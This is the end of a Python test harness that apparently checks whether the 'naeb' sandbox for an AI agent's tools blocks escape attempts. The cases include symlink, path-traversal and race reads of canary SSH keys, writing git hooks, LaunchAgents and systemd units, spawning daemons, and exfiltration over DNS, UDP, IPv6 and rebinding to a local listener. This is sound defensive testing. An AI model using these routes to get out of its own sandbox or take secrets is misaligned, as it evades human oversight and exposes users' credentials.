        lines.append("  await tools.bash({command: %s, timeout_ms: 10000}).catch(() => 0);" % q("rm -f " + q(race_stop)))
        lines.append("  out[%s] = JSON.stringify({bg, tries: i, hit, seen}); }" % q(name))
    if "c-daemon" in child:
        lines.append("await tools.sleep(5000);")
    lines.append("JSON.stringify(out)")
    script = "\n".join(lines)

    try:
        p = subprocess.run([NAEB, "js", script], cwd=proj, env=env, stdin=subprocess.DEVNULL, pass_fds=(inherited_fd,), capture_output=True, text=True, timeout=900)
    except BaseException:
        cleanup()
        raise
    try:
        results = json.loads(p.stdout.strip().splitlines()[-1])
        if isinstance(results, str):
            results = json.loads(results)
    except Exception:
        print("fixture broken: naeb exited %d\nstdout: %s\nstderr: %s" % (p.returncode, p.stdout[-2000:], p.stderr[-2000:]))
        cleanup()
        return 100

    # Unfenced controls: the same read, without naeb, must leak, or the case
    # proves nothing.
    controls = {}
    for name, (cmd, _p, ctl) in child.items():
        if ctl:
            c = subprocess.run(["bash", "-c", cmd if ctl == "same" else ctl], cwd=proj, env=env, capture_output=True, text=True, timeout=60)
            controls[name] = c.stdout + c.stderr

    if "c-daemon" in child:
        for _ in range(20):
            if os.path.exists(daemon_out):
                break
            time.sleep(0.5)
    if DARWIN and ("c-launchctl" in child or "c-open-app" in child):
        time.sleep(3)

    def output_of(name):
        r = results.get(name, "")
        if r.startswith("ERR: "):
            return r
        try:
            return json.loads(r).get("output", r)
        except Exception:
            return r

    def read(path):
        try:
            with open(path, errors="replace") as f:
                return f.read()
        except OSError:
            return None

    holes = 0
    known = 0
    secrets_ = (canary_ssh, canary_auth, canary_env)
    leaks = lambda text: any(c in (text or "") for c in secrets_)

    def verdict(name, held, why):
        nonlocal holes, known
        if name not in results:
            return
        note = KNOWN.get(name)
        if note and sys.platform.split("-")[0] not in note[0]:
            note = None
        if held:
            print("ok   %s refused%s" % (name, " (listed in KNOWN: drop it)" if note else ""))
        elif note:
            known += 1
            print("KNOWN %s %s -- %s" % (name, why, note[1]))
        else:
            holes += 1
            print("HOLE %s %s" % (name, why))
        if os.environ.get("VERBOSE"):
            print("     %s" % results[name][:600].replace("\n", "\n     "))
            if name in controls:
                print("     control: %s" % controls[name][:300].replace("\n", "\n     "))

    for name in skips:
        if not only or any(name.startswith(p) for p in only):
            print("skip %s %s" % (name, skips[name]))
    for name, ctl in controls.items():
        if not leaks(ctl):
            print("note %s: the unfenced control did not leak either: %r" % (name, ctl[:200]))

    exfil_hits = lambda tag: [g for g in exfil.got + (exfil6.got if exfil6 else []) if ("via=" + tag) in g]
    for name in ("c-symlink-read", "c-symlink-planted", "c-dotdot-read", "c-hardlink-read", "c-case-read", "c-case-read-full", "c-volfs-read",
                 "c-firmlink-read", "c-devfd", "c-env-loaders"):
        hit = [l for l in output_of(name).splitlines() if leaks(l)]
        verdict(name, not hit, "a canary was read: %s" % " / ".join(hit)[:200])
    verdict("c-case-hook", read(os.path.join(proj, ".git", "hooks", "pre-push")) is None, "a git hook was written through .GIT")
    verdict("c-case-policy", "open_home" not in (read(policy_path) or ""), "naeb.ae was changed through NAEB.AE")
    d = read(daemon_out) or ""
    verdict("c-daemon", "alive" in d and not leaks(d) and not exfil_hits("daemon"),
            "the daemon %s: %r, exfil got %r" % ("ran" if "alive" in d else "never reported (the case did not run)", d[:300], exfil_hits("daemon")))
    verdict("c-write-launchagent", read(os.path.join(home, "Library", "LaunchAgents", "evil.plist")) is None, "a LaunchAgent was written")
    verdict("c-write-systemd", read(os.path.join(home, ".config", "systemd", "user", "evil.service")) is None, "a systemd user unit was written")
    verdict("c-launchctl", all(read(m) is None for m in launchd_marks), "a launchd job ran: %r" % [read(m) for m in launchd_marks])
    verdict("c-open-app", read(app_mark) is None, "open launched the fixture app outside the jail: %r" % (read(app_mark) or "")[:200])
    verdict("c-ipv6-direct", not exfil_hits("v6direct"), "the ::1 listener got %r" % exfil_hits("v6direct"))
    verdict("c-mapped-direct", not exfil_hits("mapped"), "the exfil listener got %r" % exfil_hits("mapped"))
    verdict("c-zero-direct", not exfil_hits("zero"), "the exfil listener got %r" % exfil_hits("zero"))
    verdict("c-udp", not udp.got, "the UDP listener got %r" % udp.got)
    dn = output_of("c-dns")
    verdict("c-dns", "RESOLVED" not in dn and "ANSWERED" not in dn, "the child reached a resolver: %s" % dn[:200])
    verdict("c-proxy-variants", not exfil_hits("pv-"), "the exfil listener got %r (%s)" % (exfil_hits("pv-"), output_of("c-proxy-variants")[:600]))
    rb = [g for g in local_service.got if "via=rebind" in g]
    verdict("c-rebind", not rb, "an allowed name resolving to 127.0.0.1 reached the local service: %r" % rb)
    for name, lst in (("c-unix-symlink", planted), ("c-unix-dotdot", planted), ("c-unix-case", planted), ("c-unix-abstract", abstract)):
        if name in results:
            verdict(name, "REACHED" not in output_of(name) and not (lst and lst.got), "the socket got %r: %s" % (lst.got if lst else None, output_of(name)[:200]))
            if lst is not None:
                lst.got.clear()
    for name in ("i-symlink-read", "i-symlink-dir-read", "i-dotdot-read", "i-case-read", "i-case-auth", "i-case-read-full", "i-volfs-read", "i-firmlink-read",
                 "i-devfd", "i-proc-environ", "i-proc-root"):
        verdict(name, not leaks(results.get(name, "")), "a canary was read: %s" % results.get(name, "")[:200])
    for name in ("i-symlink-grep", "i-symlink-glob"):
        r = results.get(name, "")
        verdict(name, not leaks(r) and "id_ed25519" not in r, "the walk followed the link: %s" % r[:300])
    verdict("i-case-hook", read(os.path.join(proj, ".git", "hooks", "post-merge")) is None, "tools.write wrote a git hook through .GIT")
    verdict("i-case-policy", "widened" not in (read(policy_path) or ""), "tools.write changed naeb.ae through NAEB.AE")
    ff = results.get("i-fifo-read", "")
    verdict("i-fifo-read", ff.count("NotFile") == 2, "tools.read of a FIFO or a non-file descriptor did not refuse as NotFile: %s" % ff[:300])
    fv = results.get("i-fetch-variants", "")
    verdict("i-fetch-variants", not exfil_hits("fv-"), "the exfil listener got %r (%s)" % (exfil_hits("fv-"), fv[:300]))
    fr = [g for g in local_service.got if "via=fetch-rebind" in g]
    verdict("i-fetch-rebind", not fr, "tools.fetch of an allowed name resolving to 127.0.0.1 reached the local service: %r" % fr)
    if "i-race-read" in results:
        r = json.loads(results["i-race-read"])
        verdict("i-race-read", not r["hit"], "tools.read returned the key after %d tries while a symlink was swapped in: %s" % (r["tries"], r["hit"][:160]))
    if "i-race-write" in results:
        r = json.loads(results["i-race-write"])
        written = sorted(n for n in os.listdir(home) if n.startswith(".zshenv"))
        verdict("i-race-write", not written, "tools.write wrote %s into the fixture HOME while a directory was swapped for a symlink (%d tries)" % (written[:3], r["tries"]))
    cleanup()
    print("%d hole(s), %d known hole(s)" % (holes, known))
    return holes


if __name__ == "__main__":
    sys.exit(main(sys.argv))
